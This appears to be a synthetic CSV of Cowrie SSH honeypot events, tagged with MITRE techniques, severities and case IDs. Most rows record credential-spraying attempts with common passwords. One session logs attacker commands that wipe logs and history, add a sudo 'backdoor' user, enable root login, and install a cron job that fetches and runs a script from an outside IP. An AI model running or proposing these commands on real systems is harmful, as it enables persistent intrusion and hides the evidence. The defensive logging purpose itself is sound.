event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-0000258,78c7065042d9,2026-03-25T08:40:20.000Z,cowrie.session.connect,cowrie-ec2-prod-01,18.216.98.245,48968,172.18.0.3,2222,ssh,,,,,,UA,AS6849,JSC Ukrtelecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000259,78c7065042d9,2026-03-25T08:40:20.140Z,cowrie.client.version,cowrie-ec2-prod-01,18.216.98.245,48968,172.18.0.3,2222,ssh,,,,,,UA,AS6849,JSC Ukrtelecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000260,78c7065042d9,2026-03-25T08:40:20.733Z,cowrie.client.kex,cowrie-ec2-prod-01,18.216.98.245,48968,172.18.0.3,2222,ssh,,,,,,UA,AS6849,JSC Ukrtelecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000261,78c7065042d9,2026-03-25T08:40:23.014Z,cowrie.login.failed,cowrie-ec2-prod-01,18.216.98.245,48968,172.18.0.3,2222,ssh,ansible,111111,false,,,UA,AS6849,JSC Ukrtelecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000262,78c7065042d9,2026-03-25T08:40:25.683Z,cowrie.login.failed,cowrie-ec2-prod-01,18.216.98.245,48968,172.18.0.3,2222,ssh,administrator,passw0rd,false,,,UA,AS6849,JSC Ukrtelecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000263,78c7065042d9,2026-03-25T08:40:28.183Z,cowrie.login.failed,cowrie-ec2-prod-01,18.216.98.245,48968,172.18.0.3,2222,ssh,operator,letmein,false,,,UA,AS6849,JSC Ukrtelecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000264,78c7065042d9,2026-03-25T08:40:29.257Z,cowrie.login.failed,cowrie-ec2-prod-01,18.216.98.245,48968,172.18.0.3,2222,ssh,debian,abc123,false,,,UA,AS6849,JSC Ukrtelecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000265,78c7065042d9,2026-03-25T08:40:32.835Z,cowrie.session.closed,cowrie-ec2-prod-01,18.216.98.245,48968,172.18.0.3,2222,ssh,debian,abc123,false,,,UA,AS6849,JSC Ukrtelecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,6,2663,786,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000266,5740c47758c4,2026-04-03T18:02:48.000Z,cowrie.session.connect,cowrie-ec2-prod-01,158.140.77.234,57790,172.18.0.3,2222,ssh,,,,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000267,5740c47758c4,2026-04-03T18:02:48.348Z,cowrie.client.version,cowrie-ec2-prod-01,158.140.77.234,57790,172.18.0.3,2222,ssh,,,,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000268,5740c47758c4,2026-04-03T18:02:48.623Z,cowrie.client.kex,cowrie-ec2-prod-01,158.140.77.234,57790,172.18.0.3,2222,ssh,,,,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000269,5740c47758c4,2026-04-03T18:02:49.435Z,cowrie.login.failed,cowrie-ec2-prod-01,158.140.77.234,57790,172.18.0.3,2222,ssh,centos,dietpi,false,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000270,5740c47758c4,2026-04-03T18:02:51.177Z,cowrie.login.failed,cowrie-ec2-prod-01,158.140.77.234,57790,172.18.0.3,2222,ssh,db,libreelec,false,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000271,5740c47758c4,2026-04-03T18:02:51.824Z,cowrie.login.failed,cowrie-ec2-prod-01,158.140.77.234,57790,172.18.0.3,2222,ssh,db,changeme,false,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000272,5740c47758c4,2026-04-03T18:02:54.879Z,cowrie.session.closed,cowrie-ec2-prod-01,158.140.77.234,57790,172.18.0.3,2222,ssh,db,changeme,false,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,11,348,1321,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000273,0e7cb2f622e4,2026-04-19T03:07:33.000Z,cowrie.session.connect,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000274,0e7cb2f622e4,2026-04-19T03:07:33.310Z,cowrie.client.version,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000275,0e7cb2f622e4,2026-04-19T03:07:33.758Z,cowrie.client.kex,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000276,0e7cb2f622e4,2026-04-19T03:07:35.719Z,cowrie.login.failed,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,hadoop,linux,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000277,0e7cb2f622e4,2026-04-19T03:07:36.486Z,cowrie.login.failed,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,webmaster,password,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000278,0e7cb2f622e4,2026-04-19T03:07:38.212Z,cowrie.login.failed,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,ansible,qwerty,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000279,0e7cb2f622e4,2026-04-19T03:07:41.205Z,cowrie.login.failed,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,administrator,Admin@123,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000280,0e7cb2f622e4,2026-04-19T03:07:42.987Z,cowrie.login.failed,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,git,654321,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000281,0e7cb2f622e4,2026-04-19T03:07:44.421Z,cowrie.login.failed,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,www,osmc,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000282,0e7cb2f622e4,2026-04-19T03:07:45.888Z,cowrie.session.closed,cowrie-ec2-prod-01,215.105.57.252,62648,172.18.0.3,2222,ssh,www,osmc,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,19,546,307,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000283,7967b9429a53,2026-03-23T19:36:14.000Z,cowrie.session.connect,cowrie-ec2-prod-01,118.153.88.163,56905,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000284,7967b9429a53,2026-03-23T19:36:14.284Z,cowrie.client.version,cowrie-ec2-prod-01,118.153.88.163,56905,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000285,7967b9429a53,2026-03-23T19:36:14.756Z,cowrie.client.kex,cowrie-ec2-prod-01,118.153.88.163,56905,172.18.0.3,2222,ssh,,,,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000286,7967b9429a53,2026-03-23T19:36:17.405Z,cowrie.login.failed,cowrie-ec2-prod-01,118.153.88.163,56905,172.18.0.3,2222,ssh,nagios,linux,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000287,7967b9429a53,2026-03-23T19:36:18.757Z,cowrie.login.failed,cowrie-ec2-prod-01,118.153.88.163,56905,172.18.0.3,2222,ssh,guest,iloveyou,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000288,7967b9429a53,2026-03-23T19:36:21.142Z,cowrie.session.closed,cowrie-ec2-prod-01,118.153.88.163,56905,172.18.0.3,2222,ssh,guest,iloveyou,false,,,TW,AS3462,Data Communication Business Group,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,7,710,277,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000289,221fd95bed30,2026-03-09T20:25:45.000Z,cowrie.session.connect,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000290,221fd95bed30,2026-03-09T20:25:45.398Z,cowrie.client.version,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000291,221fd95bed30,2026-03-09T20:25:46.395Z,cowrie.client.kex,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000292,221fd95bed30,2026-03-09T20:25:48.495Z,cowrie.login.failed,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,deploy,654321,false,,,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000293,221fd95bed30,2026-03-09T20:25:49.634Z,cowrie.login.success,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,,,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000294,221fd95bed30,2026-03-09T20:26:01.613Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,hostname -f,0,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000295,221fd95bed30,2026-03-09T20:26:08.677Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,whoami,1,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000296,221fd95bed30,2026-03-09T20:26:26.145Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,hostname,2,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000297,221fd95bed30,2026-03-09T20:26:41.236Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,history -c,3,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000298,221fd95bed30,2026-03-09T20:26:45.680Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,shred -u /var/log/auth.log,4,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000299,221fd95bed30,2026-03-09T20:26:47.327Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,unset HISTFILE,5,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000300,221fd95bed30,2026-03-09T20:26:58.346Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,useradd -m -s /bin/bash -G sudo backdoor 2>/dev/null,6,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000301,221fd95bed30,2026-03-09T20:27:13.376Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config,7,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000302,221fd95bed30,2026-03-09T20:27:18.326Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -,8,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000303,221fd95bed30,2026-03-09T20:27:27.719Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,systemctl enable ssh,9,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000304,221fd95bed30,2026-03-09T20:27:38.545Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,echo '' > ~/.bash_history,10,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000305,221fd95bed30,2026-03-09T20:27:45.459Z,cowrie.command.input,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,exit,11,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,,,,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000306,221fd95bed30,2026-03-09T20:27:48.862Z,cowrie.session.closed,cowrie-ec2-prod-01,244.218.234.26,58046,172.18.0.3,2222,ssh,centos,admin123,true,,,EG,AS8452,TE Data,log_tampering,T1082,System Information Discovery,critical,,,,262,753,13281,honeypot_hit,false,HIVE-8598,,Reconnaissance of NodeJS application
EVT-0000307,dac5042288cf,2026-04-11T04:42:12.000Z,cowrie.session.connect,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,,,,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000308,dac5042288cf,2026-04-11T04:42:12.281Z,cowrie.client.version,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,,,,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000309,dac5042288cf,2026-04-11T04:42:12.672Z,cowrie.client.kex,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,,,,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000310,dac5042288cf,2026-04-11T04:42:15.073Z,cowrie.login.failed,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,webmaster,123456,false,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000311,dac5042288cf,2026-04-11T04:42:17.553Z,cowrie.login.failed,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,db,12345,false,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000312,dac5042288cf,2026-04-11T04:42:18.953Z,cowrie.login.failed,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,node,123456,false,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000313,dac5042288cf,2026-04-11T04:42:20.960Z,cowrie.login.failed,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,vagrant,admin,false,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000314,dac5042288cf,2026-04-11T04:42:23.899Z,cowrie.login.failed,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,www,mysql,false,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000315,dac5042288cf,2026-04-11T04:42:26.323Z,cowrie.login.failed,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,pi,1234,false,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000316,dac5042288cf,2026-04-11T04:42:27.902Z,cowrie.login.failed,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,service,123456789,false,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,
EVT-0000317,dac5042288cf,2026-04-11T04:42:28.910Z,cowrie.session.closed,cowrie-ec2-prod-01,82.186.235.246,60900,172.18.0.3,2222,ssh,service,123456789,false,,,RU,AS12389,Rostelecom,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,14,1428,627,bruteforce,false,,,
EVT-0000318,eeac2f0eb79a,2026-04-29T11:17:28.000Z,cowrie.session.connect,cowrie-ec2-prod-01,20.58.45.13,63223,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0000319,eeac2f0eb79a,2026-04-29T11:17:28.267Z,cowrie.client.version,cowrie-ec2-prod-01,20.58.45.13,63223,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0000320,eeac2f0eb79a,2026-04-29T11:17:28.471Z,cowrie.client.kex,cowrie-ec2-prod-01,20.58.45.13,63223,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0000321,eeac2f0eb79a,2026-04-29T11:17:31.468Z,cowrie.login.failed,cowrie-ec2-prod-01,20.58.45.13,63223,172.18.0.3,2222,ssh,guest,toor,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0000322,eeac2f0eb79a,2026-04-29T11:17:34.153Z,cowrie.login.failed,cowrie-ec2-prod-01,20.58.45.13,63223,172.18.0.3,2222,ssh,vagrant,raspberry,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0000323,eeac2f0eb79a,2026-04-29T11:17:35.700Z,cowrie.session.closed,cowrie-ec2-prod-01,20.58.45.13,63223,172.18.0.3,2222,ssh,vagrant,raspberry,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,25,1789,175,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0000324,64362ccd5a07,2026-04-24T01:18:42.000Z,cowrie.session.connect,cowrie-ec2-prod-01,144.188.6.194,65245,172.18.0.3,2222,ssh,,,,,,NL,AS1101,SURF B.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000325,64362ccd5a07,2026-04-24T01:18:42.206Z,cowrie.client.version,cowrie-ec2-prod-01,144.188.6.194,65245,172.18.0.3,2222,ssh,,,,,,NL,AS1101,SURF B.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000326,64362ccd5a07,2026-04-24T01:18:43.143Z,cowrie.client.kex,cowrie-ec2-prod-01,144.188.6.194,65245,172.18.0.3,2222,ssh,,,,,,NL,AS1101,SURF B.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000327,64362ccd5a07,2026-04-24T01:18:43.814Z,cowrie.login.failed,cowrie-ec2-prod-01,144.188.6.194,65245,172.18.0.3,2222,ssh,administrator,root,false,,,NL,AS1101,SURF B.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000328,64362ccd5a07,2026-04-24T01:18:45.416Z,cowrie.login.failed,cowrie-ec2-prod-01,144.188.6.194,65245,172.18.0.3,2222,ssh,ec2-user,Admin@123,false,,,NL,AS1101,SURF B.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000329,64362ccd5a07,2026-04-24T01:18:47.505Z,cowrie.login.failed,cowrie-ec2-prod-01,144.188.6.194,65245,172.18.0.3,2222,ssh,ec2-user,admin@123,false,,,NL,AS1101,SURF B.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000330,64362ccd5a07,2026-04-24T01:18:51.618Z,cowrie.session.closed,cowrie-ec2-prod-01,144.188.6.194,65245,172.18.0.3,2222,ssh,ec2-user,admin@123,false,,,NL,AS1101,SURF B.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,27,203,688,bruteforce,false,,,
EVT-0000331,64e48f87ddaf,2026-04-01T04:50:55.000Z,cowrie.session.connect,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,,,,,,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000332,64e48f87ddaf,2026-04-01T04:50:55.486Z,cowrie.client.version,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,,,,,,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000333,64e48f87ddaf,2026-04-01T04:50:56.357Z,cowrie.client.kex,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,,,,,,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000334,64e48f87ddaf,2026-04-01T04:50:57.774Z,cowrie.login.success,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,,,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000335,64e48f87ddaf,2026-04-01T04:51:13.718Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,cat /etc/os-release,0,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000336,64e48f87ddaf,2026-04-01T04:51:17.963Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,uptime,1,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
